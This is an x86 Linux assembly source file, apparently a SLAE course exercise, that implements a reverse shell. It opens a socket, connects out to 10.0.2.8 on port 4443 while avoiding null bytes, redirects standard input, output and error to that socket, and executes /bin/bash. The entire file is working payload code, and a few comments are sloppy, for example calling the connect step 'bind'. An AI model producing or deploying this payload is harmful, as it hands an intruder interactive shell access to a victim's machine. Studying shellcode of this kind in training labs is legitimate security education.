; Filename: reverse.nasm
; Author:  SLAE-1268

;
;
; Purpose: Reverse shell in assembly

global _start			

section .text
_start:
	
	; creating socket
	;socket(PF_INET, SOCK_STREAM, IPPROTO_IP) (2,1,0)
	xor ebx,ebx	; Make EBX 0
	xor eax, eax	; 
	push eax	; IPPROTO = 0
	inc ebx		; EBX = 1 set the socketcall type to sys_socket
	push ebx	; SOCK_STREAM = 1	
	push 0x02	; AF_INET/PF_INET = 2
	mov al,0x66	; 66hex Syscall for socket
	mov ecx,esp	; Mov pointer to arguments in ECX
	int 0x80	; call interput
	mov edx, eax 	; This allows us to save the FD from the socket
	
	;connect socket
	;bind(sockfd, {sa_family=AF_INET, sin_port=htons(4443), sin_addr=inet_addr("10.0.2.8")}, 16)
	;bind(3, {2,0x5b11,0x0100007f} 0x10)
	

	xor eax,eax
	;push 0x0802000a	; Inet_addr = 127.0.0.1 = 0100007f | 0x0802000a = 10.0.2.8
			; this has zeros, need to make calculation to get rid of zeros
	mov eax,0x0903ff0b	;
	sub eax,0x0101ff01	;	this should make eax = 	0x0802000a
	
	push eax		;

	push word 0x5b11	;0x5b11	; Port no 4443 in hex rev order
	inc ebx		; ebx = 2	
	push bx		; AF_INET/PF_INET = 2
	inc ebx		; ebx = 3	set trhe socketcall type to sys_connect
	mov ecx,esp	; Pointer to array in ecx


	;parameters in outer ()
	push 0x10	; 16 in Dec 
	push ecx	; Strcuture containing Port and IP
	push edx	; sockfd on stack
	
	;adjust ecx with arguments before syscall
	mov ecx,esp	; Argument paramters in ecx
	xor eax,eax
	mov al,0x66	; syscall for socketcall
	int 0x80
	mov edx,eax 	; This allows us to save the FD from the socke
	mov ebx,eax

	;dup2(client_sockid, STDIN) STDOUT, STDERR
	
	xor ebx,ebx	; 
	mov bl,0x03		; set EBX = 3
	xor ecx,ecx	; stdin file descriptor
	

	mov al,0x3f	; syscall for dup2()
	int 0x80	;

	mov al,0x3f
	inc ecx		; stdout file descriptor
	int 0x80	;

	mov al,0x3f
	inc ecx		; stderr file descriptor
	int 0x80	;
	
	mov al,0x3f
	inc ecx		; stderr file descriptor
	
	;execve
	xor eax,eax
	push eax	; NULL termination on stack
	push 0x68736162	; ////bin/bash on stack in reverse order
	push 0x2f6e6962	;
	push 0x2f2f2f2f	;

	mov ebx,esp	; address of the string in EBX
	mov ecx,eax	; ECX 0
	mov edx,eax	; EDX 0

	mov al,0x0b	; syscall for execve
	int 0x80	; interrupt


		
	
	
